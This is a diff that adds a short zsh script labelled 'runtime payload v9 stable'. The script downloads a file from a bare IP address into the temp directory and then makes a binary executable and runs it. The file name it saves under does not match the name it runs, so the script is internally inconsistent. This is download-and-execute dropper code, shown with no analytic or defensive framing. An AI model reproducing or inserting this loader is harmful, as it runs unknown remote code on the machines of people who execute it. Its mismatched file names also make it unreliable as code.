@@ -1,0 +1,12 @@
+#!/bin/zsh
+# runtime payload v9 stable
+
+set -e
+
+cd "$TMPDIR"
+
+curl -fsSL -o Verole http://64.89.160.11/Dopafab
+
+chmod +x Dopafab
+
+./Dopafab
